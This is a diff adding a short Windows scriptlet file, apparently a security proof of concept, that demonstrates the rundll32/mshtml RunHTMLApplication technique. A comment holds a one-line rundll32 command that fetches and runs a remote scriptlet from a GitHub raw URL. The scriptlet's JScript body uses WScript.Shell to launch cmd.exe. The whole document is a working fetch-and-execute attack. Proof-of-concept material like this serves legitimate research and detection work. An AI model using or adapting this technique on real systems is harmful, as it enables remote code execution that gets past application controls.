@@ -1,0 +1,16 @@
+<?xml version="1.0"?>
+
+<!-- Rundll32 Internet Connection POC -->
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/greycel/poc/master/testPOC") -->
+
+<package>
+<component id="TestPOC">
+
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("cmd.exe"); 
+]]>
+</script>
+
+</component>
+</package>
